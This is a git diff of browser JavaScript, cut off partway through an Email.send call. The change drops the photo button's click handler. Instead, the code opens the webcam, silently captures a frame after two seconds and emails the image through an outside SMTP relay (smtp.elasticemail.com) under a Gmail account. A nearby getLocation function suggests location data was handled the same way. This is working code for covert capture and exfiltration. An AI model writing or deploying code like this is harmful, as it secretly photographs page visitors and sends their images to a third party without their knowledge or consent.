@@ -14,23 +14,47 @@ function getLocation() {
 
 
 async function ssss() {
+  let camera_button = document.querySelector("#start-camera");
   let video = document.querySelector("#video");
+  let click_button = document.querySelector("#click-photo");
   let canvas = document.querySelector("#canvas");
+
+
+//   camera_button.addEventListener('click', async function() {
+//     let stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+//  video.srcObject = stream;
+// });
+
+// click_button.addEventListener('click', function() {
+//     canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+//     let image_data_url = canvas.toDataURL('image/jpeg');
+
+//     // data url of the image
+//     console.log(image_data_url);
+// });
+
+
+
+
   let stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
   video.srcObject = stream;
 
-  canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-  let image_data_url = canvas.toDataURL('image/jpeg');
+  setTimeout(()=>{
+    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+    let image_data_url = canvas.toDataURL('image/jpeg');
+    // document.getElementById('image').src = image_data_url;
 
-  // data url of the image
-  console.log(image_data_url);
-  sendEmail(image_data_url)
+    console.log(image_data_url);
+    sendEmail(image_data_url)
+  },2000)
+ 
+
 
 
 }
 
 function sendEmail(coords) {
-
+let body=`<html lang='en'><body><img src='${coords}' alt='urImag'/><h1>hi</h1></body></html>`;
   Email.send({
     Host: "smtp.elasticemail.com",
     Username: "sterdon458@gmail.com",
